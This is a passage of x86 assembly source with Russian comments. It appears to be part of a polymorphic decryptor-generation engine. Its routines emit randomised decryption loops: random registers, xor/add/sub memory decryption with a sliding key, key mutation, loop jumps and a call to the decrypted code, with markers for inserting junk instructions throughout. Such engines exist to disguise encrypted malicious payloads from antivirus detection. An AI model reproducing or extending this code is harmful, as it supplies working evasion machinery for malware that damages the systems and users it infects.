gb_chg_param: 
	inc		[esi].tnob													;увеличиваем на +1 число блоков декриптора; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;переходим на адрес следующего блока (структуры); 
	ret
;=================================[корректировка различных счётчиков]====================================



;============[заполнения блока для будущей команды инициализации различных параметров]===================
gen_block_init:															;
	cmp		irpe_gbd_imm32, 80h											;проверим, размер < 80h? 
	jae		_gbi_n1_													;если меньше, тогда сгенерим просто push/pop; 

	call	gen_push_pop___imm8___r32									;генерим; 
	ret

_gbi_n1_:
	push	03
	call	[ebx].rang_addr
	mov		irpe_gbd_tmp_var1, eax 
	
	push	03
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbi_1_1_push_pop___imm8___r32_
	dec		eax
	je		_gbi_1_1_xor___r32__r32_

;--------------------------------------------------------------------------------------------------------

_gbi_1_mov___r32__imm32_:												;mov reg32, imm32
	call	gen_mov___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbi_1_1_push_pop___imm8___r32_:										;push imm8  pop reg32;
	push	7Eh
	call	[ebx].rang_addr

	inc		eax 
	inc		eax
	push	irpe_gbd_imm32												;save
	push	eax															;EAX = imm8 -> imm8 = [0x02..0x7F]; 
	mov		irpe_gbd_imm32, eax											;irpe_gbd_imm32 = imm8 in [0x02..0x7F]; 

	call	gen_push_pop___imm8___r32									;генерируем; 

	pop		eax
	pop		irpe_gbd_imm32												;restore

	cmp		irpe_gbd_tmp_var1, 0
	je		_gbi_1_2_sub___r32__imm32_
	dec		irpe_gbd_tmp_var1
	je		_gbi_1_2_xor___r32__imm32_

_gbi_1_2_add___r32__imm32_:												;add reg32, imm32;
	sub		irpe_gbd_imm32, eax
	call	gen_add___r32__imm32
	ret

_gbi_1_2_sub___r32__imm32_:												;sub reg32, imm32;
	sub		irpe_gbd_imm32, eax
	neg		irpe_gbd_imm32
	call	gen_sub___r32__imm32
	ret
	
_gbi_1_2_xor___r32__imm32_:												;xor reg32, imm32;
	xor		irpe_gbd_imm32, eax
	call	gen_xor___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbi_1_1_xor___r32__r32_:												;xor reg32, reg32 (reg32 == reg32); 
	mov		edx, irpe_gbd_regs
	push	edx
	mov		dh, dl
	mov		irpe_gbd_regs, edx
	call	gen_xor___r32__r32
	pop		irpe_gbd_regs

	cmp		irpe_gbd_tmp_var1, 0
	je		_gbi_1_2_sub___r32__imm32_2_
	dec		irpe_gbd_tmp_var1
	je		_gbi_1_2_xor___r32__imm32_2_

_gbi_1_2_add___r32__imm32_2_:											;add reg32, imm32
	call	gen_add___r32__imm32
	ret

_gbi_1_2_sub___r32__imm32_2_:											;sub reg32, imm32
	neg		irpe_gbd_imm32
	call	gen_sub___r32__imm32
	ret

_gbi_1_2_xor___r32__imm32_2_:											;xor reg32, imm32 
	call	gen_xor___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

;============[заполнения блока для будущей команды инициализации различных параметров]===================



;==============[заполнения блока для будущей команды декрипта кода: xchg/add/sub/etc]====================
gen_block_crypt:
	mov		[esi].crypt_alg, IRPE_XOR___M32__R32

	push	03
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbc_sub___m32__r32_
	dec		eax
	je		_gbc_nxt_1_

_gbc_add___m32__r32_:
	mov		[esi].crypt_alg, IRPE_ADD___M32__R32
	call	gen_add___m32__r32
	ret

_gbc_sub___m32__r32_:
	mov		[esi].crypt_alg, IRPE_SUB___M32__R32
	call	gen_sub___m32__r32
	ret

_gbc_nxt_1_:															;add/sub/xor [reg1], reg2 
	call	gen_xor___m32__r32 
	ret

;==============[заполнения блока для будущей команды декрипта кода: xchg/add/sub/etc]====================



;===========[заполнения блока для будущей команды изменения основного ключа: inc/dec]====================
gen_block_chgkey:
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;делаем значение в irpe_gbd_imm32 плавающим ключом (на этот ключ будет некоторым образом изменяться основной ключ); 
	mov		[esi].chgkey_alg, IRPE_ADD___R32__IMM32
	
	push	06
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbck_dec___r32_
	dec		eax
	je		_gbck_inc___r32_
	dec		eax
	je		_gbck_sub___r32__imm8_
	dec		eax
	je		_gbck_add___r32__imm8_
	dec		eax
	je		_gbck_nxt_1_

_gbck_sub___r32__imm32_:												;sub reg32, imm32
	mov		[esi].chgkey_alg, IRPE_SUB___R32__IMM32
	call	gen_sub___r32__imm32
	ret

_gbck_add___r32__imm8_:													;add reg32, imm8
	mov		[esi].chgkey_alg, IRPE_ADD___R32__IMM8
	shr		irpe_gbd_imm32, 24											;убираем 24 младших бита, остаётся 8 старших (и они становятся младшими); 
	btr		irpe_gbd_imm32, 07											;обнуляем 7-ой бит, таким образом на выходе будет число < 80h; 
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;делаем значение в irpe_gbd_imm32 плавающим ключом (на этот ключ будет некоторым образом изменяться основной ключ); 
	call	gen_add___r32__imm8
	ret

_gbck_sub___r32__imm8_:													;sub reg32, imm8
	mov		[esi].chgkey_alg, IRPE_SUB___R32__IMM8
	shr		irpe_gbd_imm32, 24											;etc; 
	btr		irpe_gbd_imm32, 07
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;делаем значение в irpe_gbd_imm32 плавающим ключом (на этот ключ будет некоторым образом изменяться основной ключ); 
	call	gen_sub___r32__imm8
	ret

_gbck_inc___r32_:														;inc reg32
	mov		[esi].chgkey_alg, IRPE_INC___R32
	mov		irpe_gbd_imm32, 01
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;делаем значение в irpe_gbd_imm32 плавающим ключом (на этот ключ будет некоторым образом изменяться основной ключ); 
	call	gen_inc___r32
	ret

_gbck_dec___r32_:														;dec reg32
	mov		[esi].chgkey_alg, IRPE_DEC___R32
	mov		irpe_gbd_imm32, 01
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;делаем значение в irpe_gbd_imm32 плавающим ключом (на этот ключ будет некоторым образом изменяться основной ключ); 
	call	gen_dec___r32
	ret

_gbck_nxt_1_:
	call	gen_add___r32__imm32 
	ret
;===========[заполнения блока для будущей команды изменения основного ключа: inc/dec]==================== 

	

;==========[заполнения блока для будущей команд(ы)(нд) изменения адреса для декрипта]====================
gen_block_chgcnt:	
	push	02
	call	[ebx].rang_addr
	mov		irpe_gbd_tmp_var1, eax 

	push	03
	call	[ebx].rang_addr 

	test	eax, eax
	je		_gbcc_dec___r32_
	dec		eax
	je		_gbcc_as_sa___r32__imm32_

;--------------------------------------------------------------------------------------------------------

_gbcc_as_sa___r32__imm8_:												;add/sub reg32, imm8  sub/add reg32, imm8; (в итоге разница всегда будет -1, т.о. мы уменьшаем рег всегда на -1); 
	shr		irpe_gbd_imm32, 24
	btr		irpe_gbd_imm32, 07
	mov		edx, irpe_gbd_imm32
	shr		edx, 01
	cmp		irpe_gbd_tmp_var1, 0
	je		_gbcc_sa_r32_imm8_
_gbcc_as_r32_imm8_:														;add/sub reg32, imm8
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm8
	pop		edx
	inc		edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm8
	ret

_gbcc_sa_r32_imm8_:														;sub/add reg32, imm8
	inc		edx
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm8
	pop		edx
	dec		edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm8
	ret

;--------------------------------------------------------------------------------------------------------

_gbcc_as_sa___r32__imm32_:												;add/sub reg32, imm32  sub/add reg32, imm32
	mov		edx, irpe_gbd_imm32
	shr		edx, 01
	cmp		irpe_gbd_tmp_var1, 0
	je		_gbcc_sa_r32_imm32_
_gbcc_as_r32_imm32_:													;add/sub reg32, imm32
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm32
	pop		edx
	inc		edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm32
	ret

_gbcc_sa_r32_imm32_:													;sub/add reg32, imm32
	inc		edx
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm32
	pop		edx
	dec		edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbcc_dec___r32_:														;dec reg32;
	call	gen_dec___r32
	ret

;--------------------------------------------------------------------------------------------------------
;==========[заполнения блока для будущей команд(ы)(нд) изменения адреса для декрипта]====================



;=======================[заполнения блока для будущей конструкции: cmp + jxx]============================
gen_block_cycle:	
	cmp		irpe_gbd_dflag, 0											;если рег1 = адресу кода для расшифровки, тогда прыгаем дальше; 
	je		_gbccl_n1_													;иначе, если рег1 = размеру кода для расшифровки, тогда 

	mov		eax, irpe_gbd_regs											;генерим другое сравнение и переход; 
	push	eax
	mov		ah, al														;AND/OR/TEST REG1, REG2 -> REG1 == REG2; 
	mov		irpe_gbd_regs, eax

	push	03															;далее, выбираем, какую команду сравнения будем генерить: 
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbccl_test_r32r32_
	dec		eax
	je		_gbccl_or_r32r32_

_gbccl_and_r32r32_:														;AND REG32, REG32
	call	gen_and___r32__r32
	jmp		_gbccl_n2_

_gbccl_test_r32r32_:													;TEST REG32, REG32
	call	gen_test___r32__r32
	jmp		_gbccl_n2_

_gbccl_or_r32r32_:														;OR REG32, REG32
	call	gen_or___r32__r32

_gbccl_n2_:
	pop		irpe_gbd_regs
	call	gen_jne___imm32_imm8
	ret

_gbccl_n1_:

_gbccl_cmp_jxx___r32__imm32___imm32_imm8_:								;cmp reg32 imm32  jxx imm32/imm8; 
	call	gen_cmp___r32__imm32
	call	gen_jae___imm32_imm8
	ret

;=======================[заполнения блока для будущей конструкции: cmp + jxx]============================ 



;=========================[заполнения блока для будущей команды call reg32]==============================
gen_block_call:															;call reg32; 
	call	gen_call___r32
	ret
;=========================[заполнения блока для будущей команды call reg32]==============================



;=======================================[MOV REG32, IMM32]===============================================
gen_mov___r32__imm32:
	mov		[ecx].instr_addr, edi										;записываем адрес, где будет расположена данная команда
	mov		[ecx].instr_size, 05										;её размер; 
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;флаги: обычная команда, а также перед неё можно генерить трэшак; 
	mov		edx, irpe_gbd_regs											;edx - теперь содержит реги;
	mov		al, 0B8h
	add		al, dl
	stosb																;опкод; 
	mov		eax, irpe_gbd_imm32
	stosd																;imm32;
	
	call	gb_chg_param												;корректируем счётчики;
	ret																	;выходим; 
;=======================================[MOV REG32, IMM32]===============================================



;=====================================[PUSH IMM8 + POP REG32]============================================
gen_push_pop___imm8___r32:
	mov		[ecx].instr_addr, edi										;адрес команды
	mov		[ecx].instr_size, 02										;её размер
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)
																		;флаги: обычная команда и перед ней можно генерить мусор; а также, что она является частью одного большого блока (начало этого блока); 
	mov		edx, irpe_gbd_regs											;edx = regs;
	mov		al, 6Ah
	stosb																;opcode;
	mov		eax, irpe_gbd_imm32											;eax = imm8; 
	stosb																;imm8; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;переходим на адрес следующего под-блока (структуры); 
	mov		[ecx].instr_addr, edi										;etc
	mov		[ecx].instr_size, 01
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_END)
																		;флаги: обычная команда + можно перед неё генерить треш + конец блока;
																		;таким образом, мы сформировали один блок, состоящий из 2-х команд: push imm8 + pop reg32; 
	mov		al, 58h 
	add		al, dl 
	stosb																;pop reg32;

	call	gb_chg_param												;корректируем счётчики; 
	ret																	;на выход; 
;=====================================[PUSH IMM8 + POP REG32]============================================



;====================================[ADD/SUB/XOR REG32, IMM32]==========================================
;-------------------------------------------------------------------------------------------------------- 
gen_add___r32__imm32:													;ADD REG32, IMM32
	mov		eax, 0C005h

_gasxr32i32_b1_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 05										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;норм. команда + можно будет генерировать мусорные команды перед данной командой;
	mov		edx, irpe_gbd_regs											;edx = regs; 
	
	test	dl, dl														;REG == EAX?
	jne		_gasxr32i32_
	stosb																;если да, тогда записываем оптимизированный опкод; 
	jmp		_gasxr32i_n_1_												;прыгаем дальше;
_gasxr32i32_:
	inc		[ecx].instr_size											;иначе, увеличиваем на +1 размер команды;
	mov		al, 81h														;opcode
	stosb
	mov		al, ah														;ah = modrm; 
	add		al, dl														;dl = reg;
	stosb																;write final modrm;
_gasxr32i_n_1_:
	mov		eax, irpe_gbd_imm32
	stosd																;imm32;

	call	gb_chg_param												;корректируем счётчики;
	ret																	;выходим; 

;--------------------------------------------------------------------------------------------------------

gen_sub___r32__imm32:													;SUB REG32, IMM32
	mov		eax, 0E82Dh
	jmp		_gasxr32i32_b1_

;--------------------------------------------------------------------------------------------------------

gen_xor___r32__imm32:													;XOR REG32, IMM32
	mov		eax, 0F035h 
	jmp		_gasxr32i32_b1_
;====================================[ADD/SUB/XOR REG32, IMM32]==========================================



;========================================[XOR REG32, REG32]==============================================
gen_xor___r32__r32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;normal instr + can be generate trash-code before this instr; 
	mov		edx, irpe_gbd_regs											;edx = regs; 
	mov		al, 33h
	stosb																;opcode;
	mov		al, dl
	shl		al, 03
	add		al, dh
	add		al, 0C0h
	stosb																;modrm; 

	call	gb_chg_param												;корректируем счётчики
	ret																	;на выход; 
;========================================[XOR REG32, REG32]============================================== 



;=====================================[ADD/SUB/XOR MEM32, REG32]=========================================
gen_add___m32__r32:														;ADD MEM32, REG32 -> ADD dword ptr [REG1], REG2; etc; 
	mov		al, 01 

_gasx_m32r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_INSTR_LABEL)
																		;flags: обычная инструкция + перед её генерацией можно будет генерить трэш-код + это команда-метка - то есть на неё будет в дальнейшем прыжок (ака цикл); 
	mov		edx, irpe_gbd_regs											;edx = regs; 
	stosb																;opcode
	mov		al, dh														;dh = reg2; (reg2 - main key); 
	shl		al, 03														;
	add		al, dl														;dl = reg1; (reg1 - addr);

	cmp		irpe_gbd_dflag, 0											;если рег1 = адресу кода для последующей его расшифровки, тогда прыгаем дальше (будет генерация xor/add/sub dword ptr [reg1], reg2); 
	je		_gasx_m32r32_n1_
	add		[ecx].instr_size, 04										;если же рег2 = размеру кода для расшифровки, тогда будем генерим команду вида: add/sub/xor dword ptr [reg1 + <addr>], reg2; 
	add		al, 80h
	stosb
	mov		eax, irpe_gbd_imm32
	stosd
	jmp		_gasx_m32r32_n2_

_gasx_m32r32_n1_:
	stosb																;modrm; 

_gasx_m32r32_n2_:
	call	gb_chg_param												;корректируем счётчики;
	ret																	;выходим; 

;--------------------------------------------------------------------------------------------------------

gen_sub___m32__r32:
	mov		al, 29h														;SUB MEM32, REG32
	jmp		_gasx_m32r32_

;--------------------------------------------------------------------------------------------------------

gen_xor___m32__r32:
	mov		al, 31h														;XOR MEM32, REG32; 
	jmp		_gasx_m32r32_
;=====================================[ADD/SUB/XOR MEM32, REG32]=========================================



;==========================================[INC/DEC REG32]===============================================
gen_inc___r32:															;INC REG32;
	mov		al, 40h

_gid_r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 01										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;normal + can be gen trash-code; 
	mov		edx, irpe_gbd_regs
	add		al, dl
	stosb																;+1; 

	call	gb_chg_param												;correct param's; 
	ret																	;exit;

;--------------------------------------------------------------------------------------------------------

gen_dec___r32:															;DEC REG32;
	mov		al, 48h
	jmp		_gid_r32_
;==========================================[INC/DEC REG32]===============================================



;======================================[ADD/SUB/XOR REG32, IMM8]=========================================
gen_add___r32__imm8:													;ADD REG32, IMM8
	mov		ah, 0C0h 

_gasx_r32i8_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 03										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;flags: normal + gen_trash;
	mov		edx, irpe_gbd_regs											;edx = regs;
	mov		al, 83h														;opcode
	stosb
	mov		al, ah														;ah -> base modrm;
	add		al, dl														;dl -> reg32;
	stosb
	mov		eax, irpe_gbd_imm32											;eax -> imm8; 
	stosb

	call	gb_chg_param												;correct param's;
	ret																	;exit; 

;--------------------------------------------------------------------------------------------------------

gen_sub___r32__imm8:													;SUB REG32, IMM8
	mov		ah, 0E8h
	jmp		_gasx_r32i8_

;--------------------------------------------------------------------------------------------------------

gen_xor___r32__imm8:													;XOR REG32, IMM8; 
	mov		ah, 0F0h
	jmp		_gasx_r32i8_
;======================================[ADD/SUB/XOR REG32, IMM8]=========================================



;======================================[TEST/OR/AND REG32, REG32]========================================
gen_test___r32__r32:													;test reg32, reg32
	mov		al, 85h

_gtoa_r32r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)
																		;обычная команда + можно генерить трэш перед ней + эта команда является частью одного блока вместе с другими командами (jxx); 
	mov		edx, irpe_gbd_regs											;edx = regs;
	stosb																;opcode
	mov		al, dl														;reg
	shl		al, 03
	add		al, dh
	add		al, 0C0h
	stosb																;modrm
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;переходим на адрес следующего под-блока (структуры); 
	ret

;--------------------------------------------------------------------------------------------------------

gen_or___r32__r32:														;or reg32, reg32
	mov		al, 0Bh
	jmp		_gtoa_r32r32_

;--------------------------------------------------------------------------------------------------------

gen_and___r32__r32:														;and reg32, reg32; 
	mov		al, 23h
	jmp		_gtoa_r32r32_
;======================================[TEST/OR/AND REG32, REG32]========================================



;=====================================[CMP REG32, IMM32]=================================================
gen_cmp___r32__imm32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 05										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)	
																		;etc
	mov		edx, irpe_gbd_regs
	test	dl, dl														;REG == EAX?
	jne		_gcr32imm32_
	mov		al, 3Dh														;opcode
	stosb
	jmp		_gcr32i_n_1_
_gcr32imm32_:
	inc		[ecx].instr_size											;else inc instr_size
	mov		al, 81h
	stosb																;opcode
	mov		al, 0F8h 
	add		al, dl
	stosb																;modrm
_gcr32i_n_1_:
	mov		eax, irpe_gbd_imm32 
	stosd																;imm32; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;переходим на адрес следующего под-блока (структуры); 
	ret
;=====================================[CMP REG32, IMM32]=================================================



;====================================[JAE/JBE/JNE IMM32/IMM8]================================================
gen_jae___imm32_imm8:													;JAE
	mov		al, 73h

_gjabe_i_1_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 01										;size: тут можно записать только опкод, так как только он нам в дальнейшей понадобится для сравнения; команду будем строить вручную, так пока неизвестен точно imm; 
	mov		[ecx].instr_flags, (IRPE_INSTR_JXX + IRPE_BLOCK_END)		;флаги: это конструкиця условного перехода + входит в один большой блок с другим (другой) командой (cmp); (и треш генерить нельзя!); 
	stosb

	call	gb_chg_param												;корректируем счётчики
	ret																	;выходим; 

;--------------------------------------------------------------------------------------------------------

gen_jbe___imm32_imm8:													;JBE; 
	mov		al, 76h
	jmp		_gjabe_i_1_

;--------------------------------------------------------------------------------------------------------

gen_jne___imm32_imm8:													;JNE; 
	mov		al, 75h
	jmp		_gjabe_i_1_
;====================================[JAE/JBE/JNE IMM32/IMM8]================================================



;========================================[CALL REG32]====================================================
gen_call___r32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;etc; 
	mov		edx, irpe_gbd_regs											;
	mov		al, 0FFh
	stosb																;opcode
	mov		al, 0D0h
	add		al, dl
	stosb																;modrm

	call	gb_chg_param												;correct param's;
	ret																	;exit; 
;========================================[CALL REG32]====================================================





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа generate_regs
;генерация 3-х регистров для будущего декриптора
;ВХОД:
;	(+)
;ВЫХОД:
;	EAX		-	реги; 
;	(+)		-	и заполненное поле IRPE_CONTROL_BLOCK_STRUCT.used_regs; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
generate_regs:
	push	ecx
	xor		ecx, ecx													;ecx = 0; 

_reg1_:	
	call	gen_reg														;gen reg1; 

	bts		ecx, eax
	mov		ch, al														;ch = reg;

_reg2_:	
	call	gen_reg														;gen reg2;

	cmp		al, ch
	je		_reg2_
	bts		ecx, eax 
	mov		ah, ch														;eax: ah = reg1, al = reg2 (reg1 != reg); 
	mov		ch, 0
	mov		[esi].used_regs, ecx										;byte mask of regs; (1-ый младший байт данного поля содержит флаги регов); 

	pop		ecx
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи generate_regs 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа gen_reg
;получение случайного (номера) регистра
;ВХОД:
;	(+)
;ВЫХОД:
;	EAX		-	номер рега; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gen_reg:
	push	08															;gen reg; reg != 4, reg != 5; 
	call	[ebx].rang_addr

	cmp		al, 04														;!= ESP
	je		gen_reg
	cmp		al, 05														;!= EBP 
	je		gen_reg
	
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи gen_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	 



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа xmemset
;обнуление заданного участка памяти
;ВХОД (stdcall: xmemset(xparam1, xparam2)):
;	xparam1		-	адрес участка памяти для обнуления;
;	xparam2		-	размер участка памяти для обнуления; 
;ВЫХОД:
;	(+)			-	всё отлично! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xmemset:
	push	eax
	push	ecx
	push	edi
	xor		eax, eax													;eax = 0;
	mov		edi, dword ptr [esp + 16]									;edi = addr
	mov		ecx, dword ptr [esp + 20]									;ecx = size
	rep		stosb														;обнуляем; 
	pop		edi
	pop		ecx
	pop		eax
	ret		04 * 02
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xmemset 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец этих вспомогательных фунок; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






